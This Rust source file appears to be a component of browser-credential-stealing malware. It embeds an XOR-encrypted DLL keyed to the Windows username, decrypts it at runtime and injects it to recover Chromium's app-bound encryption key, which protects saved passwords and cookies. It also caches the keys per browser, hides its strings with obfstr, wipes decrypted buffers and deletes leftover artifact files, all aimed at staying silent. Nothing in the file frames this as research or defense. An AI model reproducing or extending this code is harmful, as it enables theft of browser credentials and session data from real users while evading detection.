//! Silent Chromium app-bound key recovery (embedded DLL, temp extract, auto cleanup).

use std::{collections::HashMap, collections::HashSet, path::PathBuf, sync::Mutex};
use obfstr::obfstr;

const EMBEDDED_PAYLOAD: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/payload.dll"));

static KEY_CACHE: Mutex<Option<HashMap<String, Vec<u8>>>> = Mutex::new(None);
static FAIL_CACHE: Mutex<Option<HashSet<String>>> = Mutex::new(None);

fn xor_key_from_username() -> [u8; 32] {
    let username = std::env::var(obfstr!("USERNAME")).unwrap_or_default();
    let mut key = [0u8; 32];
    let bytes = username.as_bytes();
    if bytes.is_empty() {
        return key;
    }
    for (i, slot) in key.iter_mut().enumerate() {
        *slot = bytes[i % bytes.len()];
    }
    key
}

fn decrypt_embedded_payload(encrypted: &[u8]) -> Vec<u8> {
    let key = xor_key_from_username();
    encrypted
        .iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % 32])
        .collect()
}

pub fn fetch_app_bound_key(browser_name: &str) -> Option<Vec<u8>> {
    if EMBEDDED_PAYLOAD.is_empty() {
        crate::logf!("{} ({})", obfstr!("inject skip: empty payload"), browser_name);
        return None;
    }

    if let Ok(guard) = FAIL_CACHE.lock() {
        if guard.as_ref().is_some_and(|s| s.contains(browser_name)) {
            crate::logf!("{} ({})", obfstr!("inject skip: prior fail"), browser_name);
            return None;
        }
    }
    if let Ok(guard) = KEY_CACHE.lock() {
        if let Some(map) = guard.as_ref() {
            if let Some(key) = map.get(browser_name) {
                crate::logf!("{} {}", obfstr!("inject cache hit:"), browser_name);
                return Some(key.clone());
            }
        }
    }

    crate::logf!(
        "{} {} ({} bytes)",
        obfstr!("inject start:"),
        browser_name,
        EMBEDDED_PAYLOAD.len()
    );

    let mut decrypted = decrypt_embedded_payload(EMBEDDED_PAYLOAD);
    let key = match inject::recover_key(browser_name, &decrypted) {
        Some(k) => {
            crate::logf!("{} {}", obfstr!("inject OK:"), browser_name);
            k
        }
        None => {
            crate::logf!("{} {}", obfstr!("inject FAIL:"), browser_name);
            unsafe {
                std::ptr::write_bytes(decrypted.as_mut_ptr(), 0, decrypted.len());
            }
            if let Ok(mut guard) = FAIL_CACHE.lock() {
                if guard.is_none() {
                    *guard = Some(HashSet::new());
                }
                if let Some(set) = guard.as_mut() {
                    set.insert(browser_name.to_string());
                }
            }
            return None;
        }
    };
    unsafe {
        std::ptr::write_bytes(decrypted.as_mut_ptr(), 0, decrypted.len());
    }

    if let Ok(mut guard) = KEY_CACHE.lock() {
        if guard.is_none() {
            *guard = Some(HashMap::new());
        }
        if let Some(map) = guard.as_mut() {
            map.insert(browser_name.to_string(), key.clone());
        }
    }

    Some(key)
}

// Legacy cleanup for old runs that wrote to fixed paths.
pub fn cleanup_legacy_artifacts() {
    let legacy = [
        PathBuf::from(obfstr!(r"C:\Users\Public\chrome_recovery_result.json")),
        PathBuf::from(obfstr!(r"C:\Users\Public\cr_debug.log")),
        std::env::temp_dir().join(obfstr!("chrome_recovery_result.json")),
        std::env::temp_dir().join(obfstr!("cr_headless_profile")),
    ];
    for path in legacy {
        if path.is_dir() {
            let _ = std::fs::remove_dir_all(path);
        } else {
            let _ = std::fs::remove_file(path);
        }
    }
}
